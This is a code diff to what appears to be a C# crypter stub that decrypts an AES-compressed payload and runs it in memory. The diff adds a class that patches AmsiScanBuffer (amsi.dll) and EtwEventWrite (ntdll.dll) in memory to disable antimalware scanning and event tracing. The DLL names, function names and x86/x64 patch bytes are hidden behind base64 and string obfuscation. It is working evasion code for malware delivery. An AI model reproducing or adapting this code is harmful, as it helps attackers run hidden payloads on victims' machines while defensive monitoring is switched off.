@@ -28,6 +28,7 @@ namespace Stub
             string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
             string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";
 
+            ByPass.Edr();
             RunPe(Decompress(Decrypt(payloadAesCompressStub, passwordAesCompressStub)));
         }
 
@@ -98,6 +99,156 @@ namespace Stub
                     return decompressedStream.ToArray();
                 }
             }
+        }
+    }
+    public class ByPass : StringObf
+    {
+        [DllImport("kernel32")]
+        static extern IntPtr GetProcAddress(
+            IntPtr hModule,
+            string procName);
+
+        [DllImport("kernel32")]
+        static extern IntPtr LoadLibrary(
+            string name);
+
+        [DllImport("kernel32")]
+        static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
+
+        public static void Edr()
+        {
+
+            if (Is64Bit())
+            {
+                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
+                    DecodeBase64Bytes(X64PatchSllAmsi()));
+                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
+                    DecodeBase64Bytes(X64PatchDllEtw()));
+            }
+            else if (!Is64Bit())
+            {
+                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
+                    DecodeBase64Bytes(X86PatchSllAmsi()));
+                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
+                    DecodeBase64Bytes(X86PatchDllEtw()));
+            }
+        }
+
+        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
+        {
+            IntPtr library = LoadLibrary(nameDll);
+            IntPtr procAddress = GetProcAddress(library, nameFonction);
+            uint output;
+            bool vProtect = VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);
+            Marshal.Copy(patch, 0, procAddress, patch.Length);
+        }
+
+        private static bool Is64Bit()
+        {
+            if (IntPtr.Size == 8)
+            {
+                return true;
+            }
+
+            return false;
+        }
+
+        private static string DecodeBase64Str(string input)
+        {
+            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
+        }
+
+        private static byte[] DecodeBase64Bytes(string input)
+        {
+            return Convert.FromBase64String(input);
+        }
+    }
+    public class StringObf
+    {
+        private static string _key = new GenerateKey(256).GenerateStrenghCharacter();
+        private static string Obfuscate(string input)
+        {
+            string obfuscationPattern = _key;
+            var obfuscated = new StringBuilder();
+
+            foreach (char c in input)
+            {
+                obfuscated.Append(obfuscationPattern + c + obfuscationPattern);
+            }
+
+            return obfuscated.ToString();
+        }
+
+        private static string Deobfuscate(string input)
+        {
+            string obfuscationPattern = _key;
+            return input.Replace(obfuscationPattern, "");
+        }
+
+        public static string NameDllEtw()
+        {
+            return Deobfuscate(Obfuscate("bnRkbGwuZGxs"));
+        }
+
+        public static string FonctionDllEtw()
+        {
+            return Deobfuscate(Obfuscate("RXR3RXZlbnRXcml0ZQ=="));
+        }
+
+        public static string X64PatchDllEtw()
+        {
+            return Deobfuscate(Obfuscate("SDPAww=="));
+        }
+
+        public static string X86PatchDllEtw()
+        {
+            return Deobfuscate(Obfuscate("M8DCFAA="));
+        }
+
+        public static string NameDllAmsi()
+        {
+            return Deobfuscate(Obfuscate("YW1zaS5kbGw="));
+        }
+
+        public static string FonctionDllAmsi()
+        {
+            return Deobfuscate(Obfuscate("QW1zaVNjYW5CdWZmZXI="));
+        }
+
+        public static string X64PatchSllAmsi()
+        {
+            return Deobfuscate(Obfuscate("uFcAB4DD"));
+        }
+
+        public static string X86PatchSllAmsi()
+        {
+            return Deobfuscate(Obfuscate("uFcAB4DCGAA="));
+        }
+    }
+    public class GenerateKey
+    {
+        public int SizeOfKey;
+
+        public GenerateKey(int sizeOfKey)
+        {
+            this.SizeOfKey = sizeOfKey;
+        }
+
+        public string GenerateStrenghCharacter()
+        {
+            string abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789";
+            string result = "";
+            Random
+                rnd = new Random(Guid.NewGuid()
+                    .GetHashCode()); //Pour chaque fois que la fonction est appeller il y a une chaine de caractere different
+            int iter = SizeOfKey;
+            for (int i = 0; i < iter; i++)
+                result += abc[rnd.Next(0, abc.Length)];
+            return result;
         }
     }
 }
